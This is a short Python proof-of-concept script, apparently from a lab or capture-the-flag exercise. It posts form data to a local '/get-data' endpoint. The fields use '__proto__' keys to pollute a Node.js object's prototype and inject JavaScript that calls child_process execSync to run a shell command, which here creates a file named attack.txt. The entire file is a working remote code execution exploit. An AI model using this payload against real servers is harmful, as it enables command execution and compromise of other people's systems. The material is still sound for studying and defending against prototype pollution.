import requests

url = 'http://localhost:8080/get-data'

headers = {
    "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
}

### Dictionary-like value passing
data = {
    "__proto__ [asString]": 1,
    "__proto__ [name]": 2,
    "__proto__ [inject]": "},flag:process.mainModule.require(`child_process`).execSync(`touch attack.txt`).toString()}}//"
}

x = requests.post(url, data=data, headers=headers)

print(x.text)
